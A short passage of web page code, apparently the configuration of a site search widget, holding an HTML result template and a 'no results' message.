fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
